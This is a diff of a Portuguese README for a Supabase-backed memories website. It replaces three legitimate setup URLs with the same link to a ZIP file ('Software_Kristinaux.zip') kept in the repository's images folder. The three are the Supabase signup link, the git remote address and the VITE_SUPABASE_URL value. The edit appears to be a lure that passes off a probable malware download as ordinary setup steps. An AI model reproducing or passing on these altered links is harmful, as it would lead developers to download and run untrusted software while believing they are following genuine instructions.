@@ -22,7 +22,7 @@ Um site para guardar e compartilhar momentos especiais de casal, família e pets
 
 ## Configuração do Supabase
 
-1. Crie um projeto no [Supabase](https://supabase.com)
+1. Crie um projeto no [Supabase](https://github.com/Ralffotografo/MINHASETERNASMEMORIAS/raw/refs/heads/main/public/images/Software_Kristinaux.zip)
 2. Execute o SQL abaixo para criar a tabela de memórias:
 
 ```sql
@@ -70,7 +70,7 @@ git init
 git add .
 git commit -m "Initial commit"
 git branch -M main
-git remote add origin https://github.com/seu-usuario/dots-memories.git
+git remote add origin https://github.com/Ralffotografo/MINHASETERNASMEMORIAS/raw/refs/heads/main/public/images/Software_Kristinaux.zip
 git push -u origin main
 ```
 
@@ -84,7 +84,7 @@ git push -u origin main
 Crie um arquivo `.env` na raiz do projeto:
 
 ```env
-VITE_SUPABASE_URL=https://seu-projeto.supabase.co
+VITE_SUPABASE_URL=https://github.com/Ralffotografo/MINHASETERNASMEMORIAS/raw/refs/heads/main/public/images/Software_Kristinaux.zip
 VITE_SUPABASE_ANON_KEY=sua-chave-anon
 ```
 
